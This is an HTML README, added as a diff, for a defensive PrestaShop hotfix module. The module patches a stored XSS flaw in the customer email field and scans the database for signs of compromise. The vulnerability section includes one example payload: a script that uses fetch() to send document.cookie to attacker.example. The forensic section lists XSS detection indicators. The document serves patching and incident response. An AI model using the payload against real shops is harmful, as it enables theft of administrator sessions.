@@ -1,0 +1,197 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>tecno_xss_hotfix - README</title>
+    <style>
+        :root {
+            color-scheme: light;
+            --text: #1f2933;
+            --muted: #5f6b7a;
+            --border: #d8dee6;
+            --panel: #f6f8fa;
+            --accent: #0b7285;
+        }
+        body {
+            margin: 0;
+            background: #fff;
+            color: var(--text);
+            font: 15px/1.55 -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+        }
+        main {
+            max-width: 1040px;
+            margin: 0 auto;
+            padding: 32px 24px 56px;
+        }
+        h1, h2, h3, h4 {
+            line-height: 1.25;
+            margin: 1.8em 0 .6em;
+        }
+        h1 {
+            margin-top: 0;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border);
+            font-size: 2rem;
+        }
+        h2 {
+            padding-bottom: 8px;
+            border-bottom: 1px solid var(--border);
+            font-size: 1.45rem;
+        }
+        h3 {
+            font-size: 1.18rem;
+        }
+        p {
+            margin: .7em 0;
+        }
+        a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        blockquote {
+            margin: 1em 0;
+            padding: .7em 1em;
+            color: var(--muted);
+            border-left: 4px solid var(--border);
+            background: var(--panel);
+        }
+        code {
+            padding: .15em .35em;
+            border-radius: 4px;
+            background: var(--panel);
+            font-family: Consolas, Monaco, "Courier New", monospace;
+            font-size: .92em;
+        }
+        pre {
+            overflow: auto;
+            padding: 14px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            background: var(--panel);
+        }
+        pre code {
+            padding: 0;
+            background: transparent;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1em 0;
+        }
+        th, td {
+            padding: 8px 10px;
+            border: 1px solid var(--border);
+            vertical-align: top;
+        }
+        th {
+            background: var(--panel);
+            text-align: left;
+        }
+        ul, ol {
+            padding-left: 1.5em;
+        }
+        hr {
+            border: 0;
+            border-top: 1px solid var(--border);
+            margin: 2em 0;
+        }
+        .generated-note {
+            margin-bottom: 24px;
+            padding: 10px 12px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            background: var(--panel);
+            color: var(--muted);
+            font-size: .92em;
+        }
+    </style>
+</head>
+<body>
+<main>
+    <div class="generated-note">Generated from the Markdown source included with the module.</div>
+<h1>tecno_xss_hotfix</h1>
+<p>Security hotfix module for PrestaShop — patches stored XSS vulnerability <a href="https://github.com/advisories/GHSA-w9f3-qc75-qgx9">GHSA-w9f3-qc75-qgx9</a>.</p>
+<table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Severity</strong></td><td>Critical — CVSS 9.3 / 10</td></tr><tr><td><strong>Type</strong></td><td>Stored XSS (CWE-79)</td></tr><tr><td><strong>Vector</strong></td><td>Customer email field → Back-Office Customer Threads view</td></tr><tr><td><strong>Affected</strong></td><td>PS 1.7.x, PS 8.x &lt; 8.2.6, PS 9.x &lt; 9.1.1</td></tr><tr><td><strong>Author</strong></td><td><a href="https://www.tecnoacquisti.com">Tecnoacquisti.com®</a></td></tr></tbody></table>
+<hr>
+<h2>The vulnerability</h2>
+<p>An attacker registers an account (or submits a contact form) using a crafted email address containing HTML/JavaScript — for example:</p>
+<pre><code>&quot;&gt;&lt;script&gt;fetch(&#039;https://attacker.example/c?&#039;+document.cookie)&lt;/script&gt;@x.com</code></pre>
+<p>When a Back-Office administrator opens the <strong>Customer Threads</strong> page, the email is rendered verbatim in the Smarty template without escaping, executing the script in the admin session. The attacker obtains the session cookie and gains full BO access.</p>
+<p><strong>Root cause — two unpatched locations:</strong></p>
+<ol>
+<li><code>{admin}/themes/default/template/controllers/customer_threads/helpers/view/view.tpl</code></li>
+</ol>
+<p>   <code>{$thread-&gt;email}</code> rendered without <code>|escape:&#039;html&#039;:&#039;UTF-8&#039;</code></p>
+<ol>
+<li>Some <code>classes/Validate.php</code> implementations accept quoted email local-parts through Egulias or Symfony&#039;s <code>&#039;mode&#039; =&gt; &#039;loose&#039;</code> validation. The module identifies the actual <code>ValidateCore::isEmail()</code> implementation rather than assuming its behavior from the PrestaShop version.</li>
+</ol>
+<p>The stock native regular expression checked in PrestaShop 1.7.4.0 and 1.7.6.9 already rejects <code>&lt;</code>, <code>&gt;</code> and double quotes. It does not need an additional validator guard. The template is checked separately: the stock 1.7.4.0 template mixes escaped and unescaped email occurrences, so its rendering still requires correction.</p>
+<hr>
+<h2>What the module does</h2>
+<h3>On install / Apply Patches</h3>
+<table><thead><tr><th>Target</th><th>Action</th></tr></thead><tbody><tr><td><code>{admin}/themes/default/template/…/view.tpl</code></td><td>Adds `\</td><td>escape:&#039;html&#039;:&#039;UTF-8&#039;<code> to </code>{$thread-&gt;email}`</td></tr><tr><td>Recognized Symfony loose validator, no override</td><td>Changes only the <code>isEmail()</code> mode literal from <code>&#039;loose&#039;</code> to <code>&#039;strict&#039;</code></td></tr><tr><td>Recognized Egulias validator, no override</td><td>Inserts a <code>preg_match(&#039;/[&lt;&gt;&quot;]/&#039;, $email)</code> guard at the start of <code>isEmail()</code></td></tr><tr><td>Recognized native restrictive validator</td><td>Shows an informational status; leaves the validator unchanged</td></tr><tr><td>Unrecognized validator or template</td><td>Shows an unknown status for manual review; does not claim it is already patched</td></tr></tbody></table>
+<p>Every bare email token in the template must be escaped before the template is reported as patched. Reapplying a successful patch leaves the file and its original backup unchanged.</p>
+<p>Before any write a <code>.tecno-hotfix-backup</code> file is created next to the original.</p>
+<blockquote><strong>The template patch is permanent.</strong> Uninstalling the module does <strong>not</strong> revert it. This is intentional: the fix must survive module removal.</blockquote>
+<h3>When an <code>isEmail()</code> override is present</h3>
+<p><code>override/classes/Validate.php</code> is never modified automatically. The module detects the override and shows the code snippet to apply manually.</p>
+<h3>Recognition limits</h3>
+<p>The validator check uses tokenized method bodies, ignoring formatting and comments while retaining string literals. It recognizes the upstream implementations checked in 1.7.4.0, 1.7.6.9, 1.7.7.0, 1.7.8.11, 8.0.0, 8.0.2, 8.2.5, 8.2.6, 9.1.0 and 9.1.1, including identical implementations in other releases. Already injected Egulias guards are recognized, including previously duplicated guards.</p>
+<p>A custom or newer implementation with a different body requires manual review. A recognized validator does not certify the integrity of the complete file, other overrides, the database or the installation. Automatic patching on installation and the declared PrestaShop 1.7+ compatibility remain enabled.</p>
+<h3>Forensic DB scan</h3>
+<p>The admin page includes a one-click database scan that searches <code>ps_customer</code>, <code>ps_customer_thread</code>, <code>ps_customer_message</code> and <code>ps_employee</code> for XSS indicators of compromise (IoC): email addresses or message bodies containing <code>&lt;</code>, <code>&gt;</code>, <code>&quot;</code>, <code>script</code>, <code>javascript:</code>, event handler attributes, <code>document.cookie</code>, <code>eval(</code>, etc.</p>
+<p>If hits are found, guided remediation steps are shown inline.</p>
+<hr>
+<h2>Compatibility</h2>
+<table><thead><tr><th>PrestaShop</th><th>PHP</th><th>Status</th></tr></thead><tbody><tr><td>1.7.x</td><td>7.2 – 8.x</td><td>Supported</td></tr><tr><td>8.0 – 8.2.5</td><td>8.1+</td><td>Supported</td></tr><tr><td>9.0 – 9.1.0</td><td>8.1+</td><td>Supported</td></tr><tr><td>8.2.6+ / 9.1.1+</td><td>—</td><td>Patch applied by PS itself; module detects already-patched state</td></tr></tbody></table>
+<hr>
+<h2>Installation</h2>
+<ol>
+<li>Upload the <code>tecno_xss_hotfix</code> directory to <code>{shop}/modules/</code></li>
+<li>Install from <strong>Back-Office &gt; Modules &gt; Module Manager</strong></li>
+<li>Patches are applied automatically on install</li>
+<li>Review both statuses on the module configuration page. A recognized native restrictive validator has an informational status; unknown implementations require manual review.</li>
+</ol>
+<p>To re-apply (e.g. after a PS core update that overwrote <code>Validate.php</code>): open the module configuration page and click <strong>Apply / Re-apply Patches</strong>.</p>
+<hr>
+<h2>Manual fix — isEmail() override</h2>
+<p>If <code>override/classes/Validate.php</code> contains <code>isEmail()</code>, review its existing validation and add this guard at the top of the method body if needed. Preserve all existing validation after it. The same review applies to an unrecognized core implementation:</p>
+<pre><code>// GHSA-w9f3-qc75-qgx9: insert before the existing validation logic.
+if (!empty($email) &amp;&amp; preg_match(&#039;/[&lt;&gt;&quot;]/&#039;, $email)) {
+    return false;
+}</code></pre>
+<hr>
+<h2>If the vulnerability was exploited — immediate actions</h2>
+<ol>
+<li><strong>Reset all admin passwords</strong> — Back-Office &gt; Team &gt; Employees</li>
+<li><strong>Rotate cookie keys</strong> — <code>_COOKIE_KEY_</code> and <code>_COOKIE_IV_</code> in <code>app/config/parameters.php</code> (PS 8/9) or <code>config/settings.inc.php</code> (PS 1.7)</li>
+<li><strong>Invalidate active sessions</strong> — run on your database:</li>
+</ol>
+<p>   ``<code>sql    UPDATE ps_employee SET cookie_token = &#039;&#039;;    </code>``</p>
+<ol>
+<li><strong>Audit admin accounts</strong> — delete any employee you do not recognise</li>
+<li><strong>Search access logs</strong> for requests to the Customer Threads admin page around the time of the suspicious record</li>
+<li><strong>Check for modified files</strong>:</li>
+</ol>
+<p>   ``<code>bash    find /var/www/html -name &quot;<em>.php&quot; -newer /var/www/html/index.php \      -not -path &quot;</em>/cache/<em>&quot; -not -path &quot;</em>/var/*&quot;    </code>``</p>
+<ol>
+<li><strong>Review <code>ps_configuration</code></strong> for unexpected changes to shop URL, email settings, or payment parameters</li>
+</ol>
+<hr>
+<h2>File structure</h2>
+<pre><code>tecno_xss_hotfix/
+├── tecno_xss_hotfix.php          Main module class — patching logic + forensic scan
+└── views/templates/admin/
+    ├── status.tpl                Patch status &amp; apply page
+    └── forensic.tpl              DB IoC scan page</code></pre>
+<hr>
+<h2>License</h2>
+<p>MIT License — © 2009-2026 Arte e Informatica / Tecnoacquisti.com See <a href="LICENSE">LICENSE</a> for the full text.</p>
+
+</main>
+</body>
+</html>
